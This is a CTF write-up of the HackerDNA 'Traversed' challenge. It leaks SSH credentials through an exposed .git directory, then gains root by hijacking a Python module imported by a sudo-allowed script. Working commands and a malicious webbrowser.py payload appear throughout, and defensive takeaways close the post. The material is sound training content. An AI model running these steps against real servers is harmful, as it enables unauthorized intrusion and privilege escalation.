---
layout: post
title: "Traversed HackerDNA CTF - Git Exposed & Module Hijacking"
description: "CTF writeup exploiting an exposed .git directory to recover leaked SSH credentials, then privesc via Python module hijacking with sudo."
category: hackerdna
tags: [web, ctf, hackerdna, git-exposed, python, module-hijacking, sudo, privesc]
---

## Traversed - CTF Writeup

**Category:** WEB | **Flags:** 2 (User + Root)

Challenge: [https://hackerdna.com](https://hackerdna.com)

## Contents

- [Reconnaissance](#reconnaissance)
- [Exploitation](#exploitation)
- [Privilege Escalation](#privilege-escalation)

## Reconnaissance

Nmap scan reveals two open ports:

- **22** - SSH (OpenSSH 9.7)
- **80** - HTTP (nginx 1.27.1)

The web page is a generic "under construction" site. No `robots.txt`. Running ffuf or gobuster to discover hidden files:

```bash
ffuf -u http://TARGET/FUZZ -w /opt/wordlists/SecLists/Discovery/Web-Content/common.txt -mc 200,301,302,403 -fs 533
```

This reveals a `.git` directory exposed on the web server:

| Path | Description |
|------|-------------|
| `/.git/HEAD` | `ref: refs/heads/master` |
| `/.git/config` | Repo config (author: Test) |
| `/.git/index` | Git index (2 tracked files) |
| `/.git/logs/HEAD` | Full commit history |

## Exploitation

### Step 1 - Recover Git History

The git log reveals that credentials were committed and then removed:

```bash
curl http://TARGET/.git/logs/HEAD
```

```
73e8c07 Added index.php
eba1551 Added credentials for the server maintanance
94ad98f redacted the password for security
da5d3b7 removed credentials file for safety
3087615 Modified source code for index.php
```

Use `git-dumper` to reconstruct the full repo locally:

```bash
git-dumper http://TARGET/.git/ /tmp/repo
cd /tmp/repo
git log --all --oneline
```

### Step 2 - Extract Credentials

Recover the credentials file from the commit where it was added:

```bash
git show eba1551:credentials.txt
# hackerdna:Password@1
```

### Step 3 - SSH Access

```bash
sshpass -p 'Password@1' ssh hackerdna@TARGET
cat /home/flag-user.txt
# 834f5827-e0fb-4d9b-b1d0-687dbea16a1f
```

## Privilege Escalation

### Sudo Enumeration

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/python3 /home/hackerdna/test.py
```

The allowed script `test.py`:

```python
import webbrowser
webbrowser.open("https://google.com")
```

The file is owned by root and not writable, but the **directory is writable** by the user. Python's `import` statement searches the script's directory first, so we can hijack the `webbrowser` module.

### Module Hijacking

Create a malicious `webbrowser.py` in the same directory:

```bash
cat > /home/hackerdna/webbrowser.py << 'EOF'
import os
def open(url):
    os.system("cat /root/flag-root.txt > /home/hackerdna/root_flag.txt")
EOF
```

Run the script as root — it imports our fake module instead of the real one:

```bash
sudo /usr/bin/python3 /home/hackerdna/test.py
cat /home/hackerdna/root_flag.txt
# fce6a3ab-8bce-4f4d-9983-95025be84ad9
```

**Root Flag:** `fce6a3ab-8bce-4f4d-9983-95025be84ad9`

## How the Attack Works

A publicly reachable `.git` directory leaks the entire development history of a web application. Because Git stores every commit, "removing" a file from the working tree does not remove it from the repository — the commit `eba1551` that added `credentials.txt` still exists in the object database, and the commit `94ad98f` that "redacted the password for security" only deleted it from a later snapshot. Tools like `git-dumper` reconstruct the full repo over HTTP, after which `git log` and `git show <commit>:<file>` recover any secret that was ever committed.

The privilege escalation abuses **Python's module search order**. When `sudo /usr/bin/python3 /home/hackerdna/test.py` runs, the interpreter adds the directory of the script (`/home/hackerdna`) to the front of `sys.path`. The script does `import webbrowser`, and because the user can write files in that directory, placing a malicious `webbrowser.py` there shadows the real standard-library module. Sudo then executes the import as root, running our code at the highest privilege level.

## Key Takeaways

- **`.git` exposure is full source disclosure.** Block directory listings and access to dot-prefixed paths in your web server config, and use tooling that flags exposed `.git`/`.svn`/`.hg` during recon.
- **Deleting a committed secret does not erase it.** Any credential that touches a Git history is compromised. Rotate it and rewrite history with `git filter-repo` if it was ever pushed.
- **Writable script directories + sudo are a module-hijacking risk.** Do not grant `sudo` to interpreters running scripts from directories a user can write to. `sys.path` injection is a documented, reliable root primitive.
- **`sudo -l` is the first step of every escalation.** Always enumerate exactly which binaries and scripts can be run as root before looking for kernel exploits.
